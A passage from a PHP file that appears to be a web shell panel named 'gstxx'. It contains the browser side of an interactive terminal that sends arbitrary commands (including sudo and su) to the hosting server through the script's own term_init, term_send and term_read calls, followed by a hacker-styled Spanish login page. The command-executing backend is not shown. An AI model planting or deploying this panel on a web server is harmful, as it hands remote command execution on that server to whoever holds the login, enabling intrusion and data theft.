            }

            .btn-danger {
                border-color: var(--red);
                color: var(--red)
            }

            .btn-danger:hover {
                background: var(--red);
                color: #000
            }

            @media(max-width:600px) {
                .term-bar {
                    flex-direction: column;
                    align-items: stretch
                }

                .term-input-row {
                    flex-wrap: wrap
                }

                .term-prompt {
                    font-size: .75rem
                }

                .term-input {
                    font-size: .8rem
                }
            }
        </style>
    </head>

    <body>
        <div class="term-bar">
            <div class="term-bar-title">gstxx TERMINAL — <?php echo htmlspecialchars(getSystemInfo()['host']); ?></div>
            <div><button class="btn" onclick="termClear()">CLEAR</button> <button class="btn btn-danger"
                    onclick="termReset()">RESET</button> <button class="btn btn-danger"
                    onclick="window.close()">CLOSE</button></div>
        </div>
        <div class="term-body">
            <div class="term-output" id="term-output"></div>
            <div class="term-input-row">
                <span class="term-prompt" id="term-prompt">$</span>
                <input type="text" class="term-input" id="term-input" placeholder="Type command... (sudo, su, etc.)"
                    autocomplete="off" spellcheck="false">
            </div>
            <div class="term-status"><span id="term-status-left">Initializing...</span><span id="term-status-right">PTY
                    Interactive Shell</span></div>
        </div>
        <script>
            const API = window.location.pathname;
            let termId = null;
            let termPollInterval = null;
            let termHistory = [];
            let histIdx = -1;
            let lastTermOutput = '';

            async function initTerminal() {
                try {
                    const r = await fetch(API + '?api=term_init');
                    const d = await r.json();
                    if (d.status === 'ok' && d.term_id) {
                        termId = d.term_id;
                        termAppend('[ OK ] Terminal session created (ID: ' + termId + ').\n', 'var(--c1)');
                        termAppend('[ INFO ] Interactive shell ready. Type commands below.\n', 'var(--cyan)');
                        document.getElementById('term-status-left').textContent = 'Session: active';
                        startPoll();

                        setTimeout(() => refreshOutput(), 500);
                    } else {
                        termAppend('[ ERROR ] Failed to create terminal session.\n', 'var(--red)');
                        document.getElementById('term-status-left').textContent = 'Session: error';
                    }
                } catch (e) {
                    termAppend('[ ERROR ] ' + e.message + '\n', 'var(--red)');
                }
            }

            function termAppend(text, color) {
                const out = document.getElementById('term-output');
                const span = document.createElement('span');
                span.style.color = color || 'var(--c1)';
                span.textContent = text;
                out.appendChild(span);
                out.scrollTop = out.scrollHeight;
            }

            function setTermOutput(text) {
                if (text === lastTermOutput) return;
                lastTermOutput = text;
                const out = document.getElementById('term-output');

                const sysMessages = Array.from(out.children).filter(c => c.hasAttribute('data-sys'));
                out.innerHTML = '';
                sysMessages.forEach(m => out.appendChild(m));
                const span = document.createElement('span');
                span.style.color = 'var(--c1)';
                span.textContent = text;
                out.appendChild(span);
                out.scrollTop = out.scrollHeight;
            }

            async function refreshOutput() {
                if (!termId) return;
                try {
                    const r = await fetch(API + '?api=term_read&term_id=' + termId);
                    const d = await r.json();
                    if (d.output) setTermOutput(d.output);
                    if (!d.active) {
                        document.getElementById('term-status-left').textContent = 'Session: dead';
                        stopPoll();
                    }
                } catch (e) { }
            }

            async function sendInput(input) {
                if (!termId) return;
                try {
                    const r = await fetch(API + '?api=term_send', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: 'term_id=' + encodeURIComponent(termId) + '&input=' + encodeURIComponent(input)
                    });
                    const d = await r.json();
                    if (d.output) setTermOutput(d.output);
                } catch (e) {
                    termAppend('Error: ' + e.message + '\n', 'var(--red)');
                }
            }

            function termClear() {
                document.getElementById('term-output').innerHTML = '';
            }

            async function termReset() {
                if (termId) {
                    await fetch(API + '?api=term_kill&term_id=' + termId);
                }
                termClear();
                termId = null;
                stopPoll();
                termAppend('[ RESET ] Destroying session...\n', 'var(--orange)');
                initTerminal();
            }

            function startPoll() {
                if (termPollInterval) clearInterval(termPollInterval);
                termPollInterval = setInterval(refreshOutput, 1000);
            }

            function stopPoll() {
                if (termPollInterval) { clearInterval(termPollInterval); termPollInterval = null; }
            }


            const inputEl = document.getElementById('term-input');
            inputEl.addEventListener('keydown', function (e) {
                if (e.key === 'Enter') {
                    const val = this.value;
                    this.value = '';
                    if (val.trim()) { termHistory.push(val); histIdx = termHistory.length; }
                    termAppend('$ ' + val + '\n', 'var(--cyan)');
                    sendInput(val);
                } else if (e.key === 'ArrowUp') {
                    e.preventDefault();
                    if (histIdx > 0) { histIdx--; this.value = termHistory[histIdx] || ''; }
                } else if (e.key === 'ArrowDown') {
                    e.preventDefault();
                    if (histIdx < termHistory.length - 1) { histIdx++; this.value = termHistory[histIdx] || ''; }
                    else { histIdx = termHistory.length; this.value = ''; }
                } else if (e.ctrlKey && e.key === 'c') {
                    e.preventDefault();
                    sendInput('\x03');
                    termAppend('^C\n', 'var(--red)');
                } else if (e.ctrlKey && e.key === 'd') {
                    e.preventDefault();
                    sendInput('\x04');
                } else if (e.key === 'Tab') {
                    e.preventDefault();
                    sendInput('\t');
                }
            });


            document.getElementById('term-output').addEventListener('click', () => inputEl.focus());
            inputEl.focus();


            window.addEventListener('beforeunload', function () {
                if (termId) {

                    fetch(API + '?api=term_kill&term_id=' + termId, { keepalive: true });
                }
            });


            initTerminal();
        </script>
    </body>

    </html>
    <?php
}





function showLogin($error = null)
{
    ?>
    <!DOCTYPE html>
    <html lang="es">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ACCESS
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box
                }

                @keyframes scanline {
                    0% {
                        top: -100%
                    }

                    100% {
                        top: 100%
                    }
                }

                @keyframes glitch {

                    0%,
                    100% {
                        transform: translate(0)
                    }

                    20% {
                        transform: translate(-2px, 2px)
                    }

                    40% {
                        transform: translate(2px, -2px)
                    }

                    60% {
                        transform: translate(-1px, -1px)
                    }

                    80% {
                        transform: translate(1px, 1px)
                    }
                }

                @keyframes fadeIn {
                    from {
                        opacity: 0;
                        transform: translateY(20px)
                    }

                    to {
                        opacity: 1;
                        transform: translateY(0)
                    }
                }

                body {
                    background: #0a0a0f;
                    color: #00ff41;
                    font-family: 'Courier New', monospace;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    overflow: hidden
                }

                body::before {
                    content: '';
                    position: fixed;
                    top: 0;
                    left: 0;
                    right: 0;
                    bottom: 0;
                    background: repeating-linear-gradient(0deg, rgba(0, 0, 0, .03) 0px, rgba(0, 0, 0, .03) 1px, transparent 1px, transparent 2px);
                    pointer-events: none;
                    z-index: 100
                }

                body::after {
                    content: '';
                    position: fixed;
                    top: -100%;
                    left: 0;
                    right: 0;
                    height: 200%;
                    background: linear-gradient(transparent 40%, rgba(0, 255, 65, .02) 50%, transparent 60%);
                    animation: scanline 6s linear infinite;
                    pointer-events: none;
                    z-index: 101
                }

                .login-container {
                    position: relative;
                    z-index: 10;
                    animation: fadeIn 1s ease
                }

                .login-box {
                    width: 400px;
                    max-width: 90vw;
                    background: linear-gradient(135deg, #0d0d14, #12121c);
                    border: 1px solid #00ff41;
                    padding: 40px;
                    position: relative;
                    box-shadow: 0 0 20px rgba(0, 255, 65, .1)
                }

                .login-box::before {
                    content: '';
                    position: absolute;
                    top: -1px;
                    left: -1px;
                    right: -1px;
                    bottom: -1px;
                    background: linear-gradient(45deg, #00ff41, transparent, #00ff41);
                    opacity: .1;
                    z-index: -1
                }

                .login-header {
                    text-align: center;
                    margin-bottom: 35px
                }

                .login-header h1 {
                    font-size: 1.8rem;
                    text-shadow: 0 0 10px #00ff41;
                    letter-spacing: 5px
                }

                .login-header .subtitle {
                    font-size: .7rem;
                    opacity: .4;
                    letter-spacing: 3px
                }

                .login-header .line {
                    height: 1px;
                    background: linear-gradient(90deg, transparent, #00ff41, transparent);
                    margin-top: 15px
                }

                .form-group {
                    margin-bottom: 22px
                }

                .form-label {
                    display: block;
                    margin-bottom: 6px;
                    font-size: .75rem;
                    opacity: .6;
                    text-transform: uppercase;
                    letter-spacing: 2px
                }

                .form-input {
                    width: 100%;
                    padding: 12px 15px;
                    background: rgba(0, 0, 0, .5);
                    border: 1px solid #1a1a2e;
                    color: #00ff41;
                    font-family: inherit;
                    font-size: .95rem;
                    outline: none
                }

                .form-input:focus {
                    border-color: #00ff41;
                    box-shadow: 0 0 15px rgba(0, 255, 65, .2)
                }

                .login-btn {
                    width: 100%;
                    padding: 14px;
                    background: transparent;
                    border: 1px solid #00ff41;
                    color: #00ff41;
                    font-family: inherit;
                    font-size: .9rem;
                    cursor: pointer;
                    transition: all .3s;
                    text-transform: uppercase;
                    letter-spacing: 3px
                }

                .login-btn:hover {
                    background: #00ff41;
                    color: #000;
                    box-shadow: 0 0 30px rgba(0, 255, 65, .5)
                }

                .error-box {
                    background: rgba(255, 0, 64, .1);
                    border: 1px solid #ff0040;
                    color: #ff0040;
                    padding: 10px;
                    margin-bottom: 20px;
                    text-align: center;
                    font-size: .85rem
                }

                .footer {
                    text-align: center;
                    margin-top: 25px;
                    font-size: .65rem;
                    opacity: .3
                }
            </style>
    </head>

    <body>
        <div class="login-container">
            <div class="login-box">
                <div class="login-header">
                    <h1>gstxx</h1>
                    <div class="subtitle">Terminal de Acceso Seguro</div>
                    <div class="line"></div>
                </div>
                <?php if ($error): ?>
                    <div class="error-box">⚠ <?php echo htmlspecialchars($error); ?></div><?php endif; ?>
                <form method="POST">
                    <input type="hidden" name="login" value="1">
                    <div class="form-group">
                        <label class="form-label">› Username</label>
                        <input type="text" name="username" class="form-input" placeholder="Enter username..." required
                            autofocus>
                    </div>
                    <div class="form-group">
                        <label class="form-label">› Password</label>
                        <input type="password" name="password" class="form-input" placeholder="Enter password..." required>
                    </div>
                    <button type="submit" class="login-btn">[!] ACCESS SYSTEM</button>
                </form>
                <div class="footer">gstxx PANEL v4.0
                </div>
            </div>
    </body>

    </html>
    <?php
}
?>
